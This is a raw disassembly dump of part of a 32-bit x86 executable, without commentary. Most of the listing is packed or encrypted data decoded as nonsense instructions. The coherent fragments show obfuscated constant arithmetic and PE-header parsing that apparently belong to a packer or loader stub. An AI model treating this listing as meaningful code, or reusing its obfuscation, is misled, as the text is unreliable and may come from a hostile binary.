  411267:	mov    ebp,0xd0f65a6d
  41126c:	sub    ah,BYTE PTR [ecx]
  41126e:	addr16 leave 
  411270:	dec    eax
  411271:	dec    edx
  411272:	mov    WORD PTR [ebx+0x6f1787bd],?
  411278:	pop    esp
  411279:	mov    ecx,0x944624a4
  41127e:	xchg   ecx,eax
  41127f:	cmp    eax,0x74a4111f
  411284:	outs   dx,DWORD PTR ds:[esi]
  411285:	(bad)  
  411286:	cmp    ebx,ecx
  411288:	and    bh,BYTE PTR [ebx]
  41128a:	mov    ecx,0x55e6d46e
  41128f:	aaa    
  411290:	cli    
  411291:	imul   ebx,DWORD PTR ds:[ecx+esi*1+0x67],0x47d65f5f
  41129a:	test   DWORD PTR [eax-0x7],esp
  41129d:	fdivr  QWORD PTR [eax+ebp*4]
  4112a0:	mov    ecx,0xc9b27d97
  4112a5:	xor    dh,BYTE PTR [eax-0x6b]
  4112a8:	mov    ds:0x2e4f8ace,eax
  4112ad:	mov    cl,0xd8
  4112af:	ret    0x98d2
  4112b2:	iret   
  4112b3:	mov    edx,0x542d2d0e
  4112b8:	pop    esp
  4112b9:	xchg   esi,eax
  4112ba:	fistp  WORD PTR [ecx-0x8]
  4112bd:	sahf   
  4112be:	xor    edx,DWORD PTR [esi+0x8a36e67]
  4112c4:	push   ss
  4112c5:	mov    al,0xa8
  4112c7:	adc    edi,DWORD PTR [edx]
  4112c9:	xchg   ebx,eax
  4112ca:	dec    DWORD PTR [ebx]
  4112cc:	loop   0x411256
  4112ce:	mov    al,ds:0x18a5b119
  4112d3:	shl    BYTE PTR [esi-0xee63cd9],1
  4112d9:	mov    eax,ds:0x4b92e876
  4112de:	test   al,0x74
  4112e0:	lock mov al,0x10
  4112e3:	xchg   esi,eax
  4112e4:	mov    dl,0xd9
  4112e6:	stos   BYTE PTR es:[edi],al
  4112e7:	je     0x4115eb
  4112ed:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x8d68f61e,eax
  411318:	repz sub ebp,ebx
  41131b:	dec    ecx
  41131c:	inc    ebp
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x411307
  411324:	jl     0x4113a5
  411326:	jnp    0x4112f6
  411328:	jbe    0x411320
  41132a:	mov    ebx,0x82bb013a
  41132f:	dec    edi
  411330:	mov    dl,0x9c
  411332:	aaa    
  411333:	sbb    al,0x83
  411335:	xor    BYTE PTR [edx],ch
  411337:	mov    dl,0xa2
  411339:	shl    DWORD PTR [esp+ebx*8-0x7d],1
  41133d:	pop    ds
  41133e:	bound  ebp,QWORD PTR [ebp-0xd]
  411341:	popf   
  411342:	call   DWORD PTR [eax-0x5cb1b3a6]
  411348:	mov    ds:0xe86c998e,eax
  41134d:	xchg   ebp,eax
  41134e:	jb     0x4113b1
  411350:	fst    DWORD PTR [esi]
  411352:	push   ss
  411353:	pushf  
  411354:	cdq    
  411355:	mov    esp,0xcdff57f8
  41135a:	jle    0x41136c
  41135c:	adc    eax,0x89bccb52
  411361:	inc    esi
  411362:	je     0x4113a5
  411364:	sub    BYTE PTR [ebp-0x5124d7a1],0xc6
  41136b:	lods   eax,DWORD PTR ds:[esi]
  41136c:	dec    esp
  41136d:	mov    ebx,0x2057ac6f
  411372:	inc    DWORD PTR [ebp+0x5d]
  411375:	lock in al,dx
  411377:	add    al,0x3a
  411379:	jl     0x4113cf
  41137b:	pop    edi
  41137c:	(bad)  
  41137d:	push   edx
  41137e:	and    al,0x58
  411381:	jle    0x4113da
  411383:	adc    al,0xeb
  411385:	adc    ah,0x6e
  411388:	sbb    bl,BYTE PTR [edi+0x1f759da0]
  41138e:	mov    ch,0x10
  411390:	or     al,0xca
  411392:	cmp    DWORD PTR [eax],edi
  411394:	jge    0x4113dc
  411396:	xchg   DWORD PTR [esi],edi
  411398:	push   esi
  411399:	jns    0x41134e
  41139b:	dec    edi
  41139c:	xor    DWORD PTR ds:[esi-0x7d7e30d5],0xc62fbeb0
  4113a7:	or     ebp,DWORD PTR [ebx+eiz*8-0x41c310f3]
  4113ae:	push   0x87de7574
  4113b3:	xchg   esi,eax
  4113b4:	adc    dh,bh
  4113b6:	in     eax,0xa2
  4113b8:	mov    WORD PTR [ebx+eax*8+0x502bcbd],cs
  4113bf:	sub    dl,ch
  4113c1:	neg    BYTE PTR fs:[ebp-0x124fe351]
  4113c8:	setbe  dh
  4113cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113cc:	sar    al,cl
  4113ce:	aaa    
  4113cf:	js     0x411440
  4113d1:	inc    ebx
  4113d2:	rcr    DWORD PTR [edx+0x5],cl
  4113d5:	scas   al,BYTE PTR es:[edi]
  4113d6:	arpl   WORD PTR [edi],bx
  4113d8:	add    ah,BYTE PTR [ebp-0x46a2dada]
  4113de:	xlat   BYTE PTR ds:[ebx]
  4113df:	fcomip st,st(0)
  4113e1:	or     BYTE PTR [esi],0x24
  4113e4:	lock xor eax,0x2c6f3de6
  4113ea:	std    
  4113eb:	retf   0x87fd
  4113ee:	fldenv [edi]
  4113f0:	mov    edi,cs
  4113f2:	leave  
  4113f3:	cmp    eax,0x50a9200b
  4113f8:	jecxz  0x411446
  4113fa:	sub    cl,BYTE PTR ss:[edx+eiz*4-0xa]
  4113ff:	gs test eax,0xb3e8cf8f
  411405:	dec    edi
  411406:	(bad)  
  411407:	(bad)  
  411408:	mov    eax,0x125f782b
  41140d:	imul   ebx,esp,0xae4e059d
  411413:	dec    ecx
  411414:	inc    eax
  411415:	adc    ah,BYTE PTR [esi]
  411417:	(bad)  
  411418:	retf   0x92a2
  41141b:	fsub   QWORD PTR [esi+0x77c88edb]
  411421:	jge    0x411492
  411423:	push   edx
  411424:	xor    al,BYTE PTR [eax]
  411426:	pop    ebx
  411427:	push   es
  411428:	push   edi
  411429:	fldcw  WORD PTR [ebx+0x692e468f]
  41142f:	iret   
  411430:	adc    al,0xa9
  411432:	add    esp,DWORD PTR [esi+0x3b658892]
  411438:	sub    ebp,DWORD PTR [esi]
  41143a:	jmp    0x411406
  41143c:	stos   BYTE PTR es:[edi],al
  41143d:	out    dx,eax
  41143e:	in     eax,dx
  41143f:	xchg   ebx,eax
  411440:	mov    edx,0xbbf1031d
  411445:	ja     0x4113fd
  411447:	in     eax,0x8
  411449:	aas    
  41144a:	inc    ebp
  41144b:	jl     0x4113cf
  41144d:	out    dx,al
  41144e:	mov    ?,WORD PTR [edi+0x12]
  411451:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411452:	ss dec ecx
  411454:	cmp    dl,BYTE PTR [ebp+0x2b]
  411457:	fstp   QWORD PTR [esi+0x49]
  41145a:	lock mov cl,0x98
  41145d:	sub    al,BYTE PTR [eax+ebx*4+0x13509a02]
  411464:	cdq    
  411465:	fwait
  411466:	retf   0x7a44
  411469:	mov    dh,0x51
  41146b:	jmp    0x3d3768f2
  411470:	lods   eax,DWORD PTR ds:[esi]
  411471:	mov    es,WORD PTR ds:0x6bfbd002
  411477:	mov    ebx,0xbb6e7fbd
  41147c:	cli    
  41147d:	loop   0x411488
  41147f:	adc    ecx,edi
  411481:	jmp    0x411403
  411483:	and    edx,ebx
  411485:	dec    ebx
  411486:	jg     0x411461
  411488:	fcom   QWORD PTR [ecx]
  41148a:	cmp    al,0x8c
  41148c:	sbb    BYTE PTR [esi+0x22],al
  41148f:	ss xchg edi,eax
  411491:	ja     0x41145f
  411493:	and    DWORD PTR [eax+0x2],ecx
  411496:	mov    bh,0x2
  411498:	or     al,0xd9
  41149a:	cli    
  41149b:	cmp    ebp,edi
  41149d:	popa   
  41149e:	daa    
  41149f:	cmp    eax,DWORD PTR [ecx]
  4114a1:	out    0x7e,al
  4114a3:	stc    
  4114a4:	mov    al,0xa5
  4114a6:	loopne 0x41143e
  4114a8:	cmp    eax,0xd06f067
  4114ad:	or     eax,0x62482526
  4114b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114b3:	jp     0x411511
  4114b5:	dec    ecx
  4114b6:	inc    esi
  4114b7:	dec    eax
  4114b8:	imul   edx,eax,0xffffff8f
  4114bb:	adc    ah,BYTE PTR [edi-0x7]
  4114be:	nop
  4114bf:	out    0x94,al
  4114c1:	scas   al,BYTE PTR es:[edi]
  4114c2:	push   cs
  4114c3:	addr16 push cs
  4114c5:	loopne 0x41150d
  4114c7:	das    
  4114c8:	pop    edi
  4114c9:	add    eax,DWORD PTR [eax+edi*4+0x2b]
  4114cd:	and    bh,BYTE PTR [edx+eax*1-0x4b44851d]
  4114d4:	jmp    0xb8a4258b
  4114d9:	cmp    al,0xdf
  4114db:	int3   
  4114dc:	imul   edx,DWORD PTR [edi-0x556888ed],0x9
  4114e3:	push   ebp
  4114e4:	or     edx,DWORD PTR [eax+0x7d]
  4114e7:	jl     0x4114bc
  4114e9:	stos   DWORD PTR es:[edi],eax
  4114ea:	out    dx,al
  4114eb:	jne    0x4114ca
  4114ed:	xchg   esp,eax
  4114ee:	inc    ebx
  4114ef:	sbb    BYTE PTR [edi],cl
  4114f1:	pop    esp
  4114f2:	scas   eax,DWORD PTR es:[edi]
  4114f3:	jmp    0x411541
  4114f5:	mov    al,0xbc
  4114f7:	pop    esi
  4114f8:	ins    BYTE PTR es:[edi],dx
  4114f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114fb:	xor    eax,0xeac2e8e1
  411500:	push   ebx
  411501:	mul    BYTE PTR [esi]
  411503:	lods   eax,DWORD PTR ds:[esi]
  411504:	arpl   WORD PTR [esi-0x18],cx
  411507:	dec    esp
  411508:	out    0x1,eax
  41150a:	sub    DWORD PTR [eax-0x61],0x1f
  41150e:	mov    BYTE PTR [esi+edi*1],cl
  411511:	arpl   WORD PTR [eax],cx
  411513:	shr    bl,cl
  411515:	cs test eax,0xd838a9e5
  41151b:	mov    ds:0xc46155f5,eax
  411520:	or     DWORD PTR [ecx+0x799790d6],edi
  411526:	loopne 0x411570
  411528:	jmp    0x479a:0xfe08d0ab
  41152f:	mov    bl,0xcf
  411531:	pusha  
  411532:	cmp    BYTE PTR es:0xcf6d00ee,0xad
  41153a:	xor    esi,eax
  41153c:	mov    WORD PTR [eax+0x5f1181da],gs
  411542:	sub    ah,0xb9
  411545:	pop    es
  411546:	repnz mov ebp,0x5f1763c4
  41154c:	mov    eax,ds:0x9605b602
  411551:	fild   WORD PTR [ebp+ebx*4-0x4df5563b]
  411558:	mov    esp,0x7849938a
  41155d:	fidiv  DWORD PTR [esi-0x1d96aafb]
  411563:	adc    eax,DWORD PTR [ebx]
  411565:	jne    0x411521
  411567:	ss add al,0x2f
  41156a:	push   esp
  41156b:	loop   0x411547
  41156d:	cmp    DWORD PTR ds:0x1a2b39f5,esp
  411573:	mov    eax,ds:0x158f5b79
  411578:	lahf   
  411579:	cwde   
  41157a:	pushf  
  41157b:	sub    dl,BYTE PTR [edx+0x713cd5c]
  411581:	mov    edx,0x6612600d
  411586:	ret    0x5dba
  411589:	and    al,0x16
  41158b:	imul   edx,DWORD PTR [ebx-0x606a043f],0xfffffff5
  411592:	dec    eax
  411593:	or     DWORD PTR [ecx+0x2b7db742],edi
  411599:	fnstsw WORD PTR [edx+0x35]
  41159c:	scas   eax,DWORD PTR es:[edi]
  41159d:	mov    eax,0xc003a7d6
  4115a2:	pop    edx
  4115a3:	jg     0x411562
  4115a5:	push   0xc986d4c9
  4115aa:	dec    ebx
  4115ab:	jle    0x4115bd
  4115ad:	and    al,0xc3
  4115af:	pop    ds
  4115b0:	mov    dh,0x8b
  4115b2:	mov    al,ds:0x8ca76a28
  4115b7:	pusha  
  4115b8:	imul   BYTE PTR [ebx-0x3816e442]
  4115be:	pop    ecx
  4115bf:	fisttp QWORD PTR [ebp+0x1a13b82e]
  4115c5:	mov    al,0x67
  4115c7:	add    al,BYTE PTR [edi+ebx*8+0x4e]
  4115cb:	ret    
  4115cc:	push   ds
  4115cd:	pop    eax
  4115ce:	retf   0x8d66
  4115d1:	and    ebx,DWORD PTR ds:0x8558b64
  4115d7:	xor    eax,ecx
  4115d9:	lea    eax,[eax+edx*1+0x32729b]
  4115e0:	mov    DWORD PTR [ebp+0x8],eax
  4115e3:	inc    DWORD PTR [ebp+0xc]
  4115e6:	jmp    0x410fe6
  4115eb:	mov    eax,DWORD PTR [ebp-0x10]
  4115ee:	xor    eax,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	sbb    esp,DWORD PTR [edi+0x44]
  41161b:	mov    DWORD PTR [esi-0x5b8181c0],0x2d7e7e7f
  411625:	outs   dx,DWORD PTR ds:[esi]
  411626:	jge    0x411689
  411628:	cmp    ah,BYTE PTR fs:[ebx]
  41162b:	popa   
  41162c:	pop    ss
  41162d:	xchg   BYTE PTR [eax],bh
  41162f:	mov    al,ds:0xb28e3b01
  411634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411635:	dec    esp
  411636:	and    BYTE PTR [ecx+0x477e76f],dh
  41163c:	sub    DWORD PTR [eax],eax
  41163e:	cwde   
  41163f:	ficomp DWORD PTR [ebx-0x57660cc3]
  411645:	out    dx,al
  411646:	test   BYTE PTR [edx+0x2c],bl
  411649:	test   DWORD PTR [esi],ebx
  41164b:	jp     0x411664
  41164d:	dec    edx
  41164e:	call   0x70d42ce0
  411653:	mov    ah,0xbe
  411655:	jmp    0x411653
  411657:	arpl   WORD PTR [ecx+0x26a31fb3],si
  41165d:	(bad)  
  41165e:	jne    0x4115f8
  411660:	xchg   ebp,eax
  411661:	call   0x9ca1ba4d
  411666:	jecxz  0x41162a
  411668:	imul   ebx,DWORD PTR [eax-0x264a3ff6],0x18e2cf37
  411672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411673:	int3   
  411674:	in     al,dx
  411675:	das    
  411676:	mov    al,ds:0x396088fb
  41167b:	mov    cl,0xd6
  41167d:	inc    ebx
  41167e:	movaps xmm6,XMMWORD PTR [ebp+0x6b]
  411682:	mov    edi,0x832981a6
  411687:	sbb    DWORD PTR [edx+0x23],eax
  41168a:	push   0xfffffff4
  41168c:	les    ebp,FWORD PTR [ecx+0x2b3abb30]
  411692:	iret   
  411693:	mov    esi,0x5e914b89
  411698:	hlt    
  411699:	pop    ss
  41169a:	fsubr  QWORD PTR [edi-0x73b9155d]
  4116a0:	cmovo  si,WORD PTR [edi]
  4116a4:	gs lock mov esi,0x27dbe55d
  4116ab:	imul   edx,DWORD PTR [ebx-0x3a00832f],0x24
  4116b2:	cmp    DWORD PTR [esi+eiz*2-0x335cd36],ebp
  4116b9:	test   al,0x1e
  4116bb:	fcomp  QWORD PTR [edx-0x6b]
  4116be:	popf   
  4116bf:	dec    esi
  4116c0:	imul   dl
  4116c2:	call   0x543aa31d
  4116c7:	fs addr16 retf 
  4116ca:	imul   ecx,DWORD PTR [esi+0x79f715ae],0x60f7579d
  4116d4:	daa    
  4116d5:	lea    ebp,[edx]
  4116d7:	sub    eax,0x417f8a5f
  4116dc:	adc    BYTE PTR [eax+eiz*4+0x5c056b14],cl
  4116e3:	push   esp
  4116e4:	pop    ebp
  4116e5:	imul   ecx,DWORD PTR [esi+edi*8-0x7a0c476f],0xcd25a15a
  4116f0:	ds push esi
  4116f2:	push   ds
  4116f3:	pop    eax
  4116f4:	fild   QWORD PTR [ecx+0x33]
  4116f7:	push   esp
  4116f8:	inc    eax
  4116f9:	xor    DWORD PTR [edi],esp
  4116fb:	mov    cl,0x49
  4116fd:	sti    
  4116fe:	mov    edi,DWORD PTR es:[ecx-0x2c]
  411702:	add    DWORD PTR [edx],esp
  411704:	gs sbb al,0xb5
  411707:	(bad)  
  411708:	mov    ds:0x7a235e9,al
  41170d:	popf   
  41170e:	leave  
  41170f:	pushf  
  411710:	loopne 0x411732
  411712:	jbe    0x411785
  411714:	(bad)  
  411715:	das    
  411716:	aam    0xd5
  411718:	int3   
  411719:	hlt    
  41171a:	mov    ah,0x39
  41171c:	(bad)  
  41171d:	stos   BYTE PTR es:[edi],al
  41171e:	into   
  41171f:	test   al,0xe2
  411721:	ins    BYTE PTR es:[edi],dx
  411722:	inc    ecx
  411723:	fcmovbe st,st(2)
  411725:	xchg   ebx,eax
  411726:	cld    
  411727:	adc    eax,ecx
  411729:	arpl   WORD PTR [ecx-0x12],sp
  41172c:	sbb    bh,BYTE PTR [edi+0x5c]
  41172f:	shl    BYTE PTR [ebx-0x96042d9],cl
  411735:	push   ss
  411736:	(bad)  
  411737:	das    
  411738:	lea    ecx,[edx-0x16d72ef1]
  41173e:	push   esi
  41173f:	push   ebp
  411740:	div    cl
  411742:	mov    ch,0xa2
  411744:	mov    esi,0xf6682d0d
  411749:	mov    al,0x18
  41174b:	lock inc ecx
  41174d:	(bad)  
  41174e:	lahf   
  41174f:	idiv   DWORD PTR [ecx-0x5b70b827]
  411755:	xchg   BYTE PTR [ebp+0x2554c74f],ch
  41175b:	data16 arpl WORD PTR [edi+0x52e97b1a],si
  411762:	adc    dl,BYTE PTR [ebx-0x79a43de6]
  411768:	fidivr DWORD PTR [esi+0x2a]
  41176b:	iret   
  41176c:	test   al,0x3c
  41176e:	inc    esp
  41176f:	sub    eax,DWORD PTR [ecx]
  411771:	inc    edi
  411772:	repnz clc 
  411774:	sbb    BYTE PTR [edi+0x6bd90e82],0xca
  41177b:	retf   
  41177c:	cs enter 0x5e9c,0x82
  411781:	(bad)  
  411782:	or     edi,DWORD PTR [ebp+0x4e]
  411785:	xchg   esi,eax
  411786:	neg    al
  411788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411789:	and    dh,BYTE PTR [esi-0x74]
  41178c:	pusha  
  41178d:	imul   esi,DWORD PTR [esp+edx*1+0x3b],0xfa79527e
  411795:	push   edi
  411796:	adc    ebx,DWORD PTR [ebx-0x47ab16a7]
  41179c:	or     BYTE PTR [esi+0xe],dl
  41179f:	(bad)  
  4117a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117a1:	fdivr  DWORD PTR [edx]
  4117a3:	repnz sub eax,0x5abb28d4
  4117a9:	mov    ah,0x5
  4117ab:	sbb    ebp,ebp
  4117ad:	popf   
  4117ae:	and    BYTE PTR [edx-0x2c],bh
  4117b1:	push   cs
  4117b2:	inc    edi
  4117b3:	dec    ebx
  4117b4:	sub    al,0x6b
  4117b6:	loope  0x41177b
  4117b8:	and    eax,0xd0ace537
  4117bd:	pop    ss
  4117be:	call   FWORD PTR [ebp-0x6b]
  4117c1:	jne    0x411758
  4117c3:	jg     0x411750
  4117c5:	aaa    
  4117c6:	or     eax,0x8e1c400b
  4117cb:	xor    eax,DWORD PTR [esi]
  4117cd:	(bad)  [ebx+0x5c70845]
  4117d3:	mov    ds:0x3d004336,eax
  4117d8:	inc    edx
  4117d9:	add    BYTE PTR [eax],al
  4117db:	mov    al,BYTE PTR [eax]
  4117dd:	sub    DWORD PTR ds:0x4335ff,0x6d7d
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43369f,0x433603
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43369f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43361b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x4336ab,0x0
  41182f:	mov    eax,ds:0x4336ab
  411834:	inc    eax
  411835:	mov    ds:0x4336ab,eax
  41183a:	cmp    DWORD PTR ds:0x4336ab,0xb
  411841:	jne    0x411887
  411847:	push   0x4337bc
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x4336ab,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x4336ab
  411899:	inc    eax
  41189a:	mov    ds:0x4336ab,eax
  41189f:	cmp    DWORD PTR ds:0x4336ab,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	popa   
  4118e8:	push   0x4e2c2caa
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x4118fa
  4118f4:	fld    TBYTE PTR [edi+edx*1]
  4118f7:	lahf   
  4118f8:	sub    al,0x86
  4118fa:	cdq    
  4118fb:	sar    BYTE PTR ds:0x7f37ffc5,1
  411901:	xlat   BYTE PTR ds:[ebx]
  411902:	pop    edx
  411903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411904:	test   dh,0xda
  411907:	icebp  
  411908:	add    DWORD PTR [edi],eax
  41190a:	adc    DWORD PTR [eiz*4+0xe729bf5],ebp
  411911:	sbb    DWORD PTR [edi+0x390ae7ff],edi
  411917:	sti    
  411918:	in     al,dx
  411919:	jnp    0x4118bb
  41191b:	mov    ecx,0x7dd2de83
  411920:	test   eax,0xcfd28a4b
  411925:	pop    es
  411926:	dec    esp
  411927:	adc    eax,0x1ebd32be
  41192c:	dec    esp
  41192d:	push   eax
  41192e:	pop    edx
  41192f:	out    dx,eax
  411930:	pop    edi
  411931:	js     0x4118dc
  411933:	sub    al,0x24
  411935:	push   ebx
  411936:	retf   
  411937:	je     0x411951
  411939:	sbb    dh,BYTE PTR [edx-0x70]
  41193c:	stc    
  41193d:	sbb    eax,0x99d91b94
  411942:	js     0x4119c2
  411944:	push   ebp
  411945:	dec    edx
  411946:	enter  0x4a0e,0xe4
  41194a:	jae    0x4118cd
  41194c:	jp     0x411978
  41194e:	outs   dx,DWORD PTR ds:[esi]
  41194f:	xchg   DWORD PTR [ebp+0x29],ecx
  411952:	ja     0x411947
  411954:	js     0x411920
  411956:	sub    BYTE PTR [ebx],bl
  411958:	inc    edi
  411959:	xor    esi,ebx
  41195b:	sbb    cl,bl
  41195d:	ror    BYTE PTR [eax-0x10ff83b1],1
  411963:	jl     0x411982
  411965:	jno    0x41198f
  411967:	in     eax,0xca
  411969:	fwait
  41196a:	adc    DWORD PTR [ecx],ebx
  41196c:	sbb    al,0xef
  41196e:	jb     0x4119c6
  411970:	push   ds
  411971:	dec    eax
  411972:	jmp    0x41190b
  411974:	(bad)  
  411975:	call   DWORD PTR [ecx]
  411977:	aad    0xbb
  411979:	(bad)  
  41197a:	int3   
  41197b:	adc    eax,0x913eddd
  411980:	xchg   ebp,eax
  411981:	test   al,0xa2
  411983:	xchg   ecx,eax
  411984:	bound  eax,QWORD PTR [eax+0x4195bf55]
  41198a:	pop    esp
  41198b:	add    BYTE PTR [ebx+edx*8+0x1b],cl
  41198f:	push   ss
  411990:	fnstenv [edi]
  411992:	push   es
  411993:	xchg   DWORD PTR [edx-0x4f],esi
  411996:	test   BYTE PTR [ebp+0x1f],ah
  411999:	dec    eax
  41199a:	xchg   esi,eax
  41199b:	iret   
  41199c:	sub    esp,ebp
  41199e:	pop    eax
  41199f:	and    DWORD PTR [ebx-0x5342f0d],0xffffff90
  4119a6:	mov    ?,ebp
  4119a8:	mov    ch,BYTE PTR [ebp+0x444f59fb]
  4119ae:	inc    eax
  4119af:	and    BYTE PTR [edi+0x2a],dl
  4119b2:	or     bh,BYTE PTR [ebx+0x74b140a]
  4119b8:	aaa    
  4119b9:	jmp    0xf0bcb2e7
  4119be:	dec    ebp
  4119bf:	mov    edi,0x3fabe1a1
  4119c4:	and    BYTE PTR [edi+0x354e3129],dh
  4119ca:	sbb    al,0xef
  4119cc:	push   ecx
  4119cd:	mov    edx,0x94069f05
  4119d2:	pop    ds
  4119d3:	xchg   esp,eax
  4119d4:	mov    dl,0x85
  4119d6:	pop    esp
  4119d7:	cdq    
  4119d8:	or     eax,edi
  4119da:	add    eax,0xd851a4a0
  4119df:	cmc    
  4119e0:	mov    ebp,0x39716124
  4119e5:	mov    ebx,0xa9717f2e
  4119ea:	lods   eax,DWORD PTR ds:[esi]
  4119eb:	and    bh,bh
  4119ed:	push   esi
  4119ee:	daa    
  4119ef:	xchg   esi,eax
  4119f0:	mov    edi,0xb04dd3b0
  4119f5:	test   DWORD PTR [ebp+0x3f8a736c],ebx
  4119fb:	push   esp
  4119fc:	jb     0x4119ea
  4119fe:	dec    edi
  4119ff:	jmp    0xcbd4:0x254a9581
  411a06:	push   0xffffffeb
  411a08:	add    BYTE PTR [ecx-0x6c],dh
  411a0b:	push   0x27807dd1
  411a10:	ds int 0xba
  411a13:	jne    0x411a58
  411a15:	scas   eax,DWORD PTR es:[edi]
  411a16:	call   0xb3c0a5a2
  411a1b:	aaa    
  411a1c:	das    
  411a1d:	ja     0x4119cd
  411a1f:	pop    eax
  411a20:	inc    eax
  411a21:	aas    
  411a22:	xchg   edx,eax
  411a23:	out    0xff,eax
  411a25:	and    al,0x40
  411a27:	in     al,0x42
  411a29:	loopne 0x411a8c
  411a2b:	jl     0x411a7e
  411a2d:	ror    dh,1
  411a2f:	nop
  411a30:	pop    eax
  411a31:	hlt    
  411a32:	les    esi,FWORD PTR [ebx]
  411a34:	int    0x95
  411a36:	adc    cl,0x58
  411a39:	ror    BYTE PTR [eax+0x51],1
  411a3c:	sbb    al,0x9b
  411a3e:	mov    ebp,0x5b517da6
  411a43:	push   cs
  411a44:	call   0x7355:0x5f9611f1
  411a4b:	and    BYTE PTR [ebx-0x73],0xbb
  411a4f:	add    BYTE PTR [ebx+0x7fa95ac],al
  411a55:	test   cl,ch
  411a57:	xchg   edi,eax
  411a58:	aas    
  411a59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a5a:	in     eax,0xbb
  411a5c:	adc    eax,0xf71a2daf
  411a61:	cmp    cl,bh
  411a63:	push   es
  411a64:	dec    esi
  411a65:	lahf   
  411a66:	ret    0x5580
  411a69:	(bad)  
  411a6a:	jno    0x411a72
  411a6c:	(bad)  
  411a6d:	test   al,0x1e
  411a6f:	jnp    0x411a24
  411a71:	xchg   ebp,eax
  411a72:	add    eax,0xb986f7d1
  411a77:	sub    edi,DWORD PTR [ebp+0x46]
  411a7a:	dec    ecx
  411a7b:	fcmovb st,st(2)
  411a7d:	or     dl,BYTE PTR [edx-0x2f]
  411a80:	adc    DWORD PTR [ecx-0x2b5db9f6],esp
  411a86:	nop
  411a87:	les    eax,FWORD PTR [esi]
  411a89:	and    dh,BYTE PTR [ebx]
  411a8b:	push   0xf5439bd7
  411a90:	leave  
  411a91:	xchg   ecx,eax
  411a92:	stc    
  411a93:	jbe    0x411ab2
  411a95:	inc    BYTE PTR [ebp-0x6412fd14]
  411a9b:	xchg   ebx,eax
  411a9c:	inc    edi
  411a9d:	add    eax,ecx
  411a9f:	jmp    0x411ab1
  411aa4:	mov    eax,DWORD PTR [ebp-0x4]
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
